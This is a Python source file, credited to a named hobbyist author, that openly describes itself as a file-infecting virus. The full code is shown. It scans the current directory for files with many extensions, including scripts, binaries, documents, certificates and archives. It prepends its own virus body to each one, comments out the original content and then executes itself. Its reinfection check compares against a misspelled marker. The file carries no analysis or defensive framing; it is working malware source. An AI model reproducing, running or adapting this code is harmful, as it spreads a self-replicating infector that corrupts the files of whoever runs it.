"""
Infest .py files to a malicious code - e(py)demic.py
Author: Ma~Far$ | T0x1cEnv1op3 (a.k.a. Yahav N. Hoffmann)
Compile: ./pyinstaller e(py)demic.py
Writen 2015 - Modified 2016
This program is open source you can copy and modify, but please keep author credit!

can view source at SoloLearn:
-> https://code.sololearn.com/cA9wg0D19ddH/#py
"""
#!/usr/bin/python

# === INFECTED ===
# ^ this is the marker for beginning of the virus
import os
from sys import argv

# all possible target files
targets = ['.py', '.sh', '.c',
           '.h', '.cpp', '.java',
           '.bin', '.dmr', '.db',
           '.txt', '.doc', '.docx',
           '.pub', '.crt', '.crf',
           '.lnk', '.exe', '.dmg',
           '.zip', '.gpg', '.tar']

# Read the text for this file
this_file = open(argv[0])
this_lines = this_file.readlines()
this_file.close()

for i in range(len(this_lines)):
    # orig_index is the line where the non-virulent code starts
    if this_lines[i] == "# === ORIGINAL ===\n":
        orig_index = i+1
        break

for fname in os.listdir('.'):
    for target in targets:
        if fname.find(target) == len(fname) - len(target):
            try:
                script_file = open(fname, 'r+')
                target_lines = script_file.readlines()
                script_file.seek(0)
                try:
                    if target_lines[1] != "# ===INFECTED ===\n": # Fond infected file
                        script_file.write("".join(this_lines[:orig_index])) # infect it
                        for target_line in target_lines:
                            script_file.write("# %s" % target_line)
                        script_file.close()
                except: # Somthing went worng Reverse the changes
                    script_file.close()
                    script_file = open(fname, 'w')
                    for target_line in target_lines:
                        script_file.write(target_line)
                    script_file.close()
                    os._exit(1)
            except:
              pass

# now execute the non-virulent code
exec("".join(map(lambda x: x[2:], this_lines[orig_index:])))

# v This is the marker to indicate the end of the virulent code
# === ORIGINAL ===
